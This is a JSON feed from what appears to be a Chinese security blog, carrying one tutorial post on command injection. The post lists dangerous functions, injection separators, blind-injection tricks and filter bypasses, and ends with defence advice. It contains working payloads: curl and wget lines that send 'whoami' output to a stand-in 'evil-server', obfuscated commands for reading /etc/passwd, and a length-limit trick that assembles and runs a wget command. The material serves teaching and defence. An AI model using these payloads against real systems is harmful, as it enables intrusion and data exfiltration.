{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"函数\" tag",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/command%20insert/",
            "title": "命令注入",
            "date_published": "2022-11-26T09:30:44.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>命令注入通常因为指 Web 应用在服务器上拼接系统命令而造成的漏洞。</p>\n<p>该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些 Web 管理界面的配置主机名 / IP / 掩码 / 网关、查看系统信息以及关闭重启等功能，或者一些站点提供如 ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</p>\n<h1 id=\"常见危险函数\"><a class=\"anchor\" href=\"#常见危险函数\">#</a> 常见危险函数</h1>\n<h2 id=\"php\"><a class=\"anchor\" href=\"#php\">#</a> PHP</h2>\n<ul>\n<li>system</li>\n<li>exec</li>\n<li>passthru</li>\n<li>shell_exec</li>\n<li>popen</li>\n<li>proc_open</li>\n</ul>\n<h2 id=\"python\"><a class=\"anchor\" href=\"#python\">#</a> Python</h2>\n<ul>\n<li>system</li>\n<li>popen</li>\n<li>subprocess.call</li>\n<li>spawn</li>\n</ul>\n<h2 id=\"java\"><a class=\"anchor\" href=\"#java\">#</a> Java</h2>\n<ul>\n<li>java.lang.Runtime.getRuntime().exec(command)</li>\n</ul>\n<h1 id=\"常见注入方式\"><a class=\"anchor\" href=\"#常见注入方式\">#</a> 常见注入方式</h1>\n<ul>\n<li>分号分割</li>\n<li><code>||</code>   <code>&amp;&amp;</code>   <code>&amp;</code>  分割</li>\n<li><code>|</code>  管道符</li>\n<li><code>\\r\\n</code>   <code>%d0%a0</code>  换行</li>\n<li>反引号解析</li>\n<li><code>$()</code>  替换</li>\n</ul>\n<h1 id=\"无回显技巧\"><a class=\"anchor\" href=\"#无回显技巧\">#</a> 无回显技巧</h1>\n<ul>\n<li>\n<p>bash 反弹 shell</p>\n</li>\n<li>\n<p>DNS 带外数据</p>\n</li>\n<li>\n<p>http 带外</p>\n<ul>\n<li><code>curl http://evil-server/$(whoami)</code></li>\n<li><code>wget http://evil-server/$(whoami)</code></li>\n</ul>\n</li>\n<li>\n<p>无带外时利用  <code>sleep</code>  或其他逻辑构造布尔条件</p>\n</li>\n</ul>\n<h1 id=\"常见绕过方式\"><a class=\"anchor\" href=\"#常见绕过方式\">#</a> 常见绕过方式</h1>\n<h2 id=\"空格绕过\"><a class=\"anchor\" href=\"#空格绕过\">#</a> 空格绕过</h2>\n<ul>\n<li><code>&lt;</code>  符号  <code>cat&lt;123</code></li>\n<li><code>\\t</code>  /  <code>%09</code></li>\n<li><code>$&#123;IFS&#125;</code>   其中 {} 用来截断，比如 <code>cat$IFS2</code>  会被认为 IFS2 是变量名。另外，在后面加个 $ 可以起到截断的作用，一般用 $9，因为 $9 是当前系统 shell 进程的第九个参数的持有者，它始终为空字符串</li>\n</ul>\n<h2 id=\"黑名单绕过\"><a class=\"anchor\" href=\"#黑名单绕过\">#</a> 黑名单绕过</h2>\n<ul>\n<li><code>a=l;b=s;$a$b</code></li>\n<li>base64  <code>echo &quot;bHM=&quot; | base64 -d</code></li>\n<li><code>/?in/?s</code>  =&gt;  <code>/bin/ls</code></li>\n<li>连接符  <code>cat /etc/pass'w'd</code></li>\n<li>未定义的初始化变量  <code>cat$x /etc/passwd</code></li>\n</ul>\n<h2 id=\"长度限制绕过\"><a class=\"anchor\" href=\"#长度限制绕过\">#</a> 长度限制绕过</h2>\n<pre><code>&gt;wget\\\n&gt;foo.\\\n&gt;com\nls -t&gt;a\nsh a\n</code></pre>\n<p>上面的方法为通过命令行重定向写入命令，接着通过 ls 按时间排序把命令写入文件，最后执行 直接在 Linux 终端下执行的话，创建文件需要在重定向符号之前添加命令 这里可以使用一些诸如 w,[之类的短命令，(使用 ls /usr/bin/? 查看) 如果不添加命令，需要 Ctrl+D 才能结束，这样就等于标准输入流的重定向 而在 php 中，使用 shell_exec 等执行系统命令的函数的时候，是不存在标准输入流的，所以可以直接创建文件</p>\n<h1 id=\"常用符号\"><a class=\"anchor\" href=\"#常用符号\">#</a> 常用符号</h1>\n<h2 id=\"命令分隔符\"><a class=\"anchor\" href=\"#命令分隔符\">#</a> 命令分隔符</h2>\n<ul>\n<li><code>%0a</code>  /  <code>%0d</code>  /  <code>\\n</code>  /  <code>\\r</code></li>\n<li><code>;</code></li>\n<li><code>&amp;</code>  /  <code>&amp;&amp;</code></li>\n</ul>\n<h2 id=\"通配符\"><a class=\"anchor\" href=\"#通配符\">#</a> 通配符</h2>\n<ul>\n<li><code>*</code>  0 到无穷个任意字符</li>\n<li><code>?</code>  一个任意字符</li>\n<li><code>[ ]</code>  一个在括号内的字符，e.g.  <code>[abcd]</code></li>\n<li><code>[ - ]</code>  在编码顺序内的所有字符</li>\n<li><code>[^ ]</code>  一个不在括号内的字符</li>\n</ul>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>\n<p>不使用时禁用相应函数</p>\n</li>\n<li>\n<p>尽量不要执行外部的应用程序或命令</p>\n</li>\n<li>\n<p>做输入的格式检查</p>\n</li>\n<li>\n<p>转义命令中的所有 shell 元字符</p>\n<ul>\n<li>shell 元字符包括  <code>#&amp;;`,|*?~&lt;&gt;^()[]&#123;&#125;$\\</code></li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "注入",
                "函数",
                "绕过"
            ]
        }
    ]
}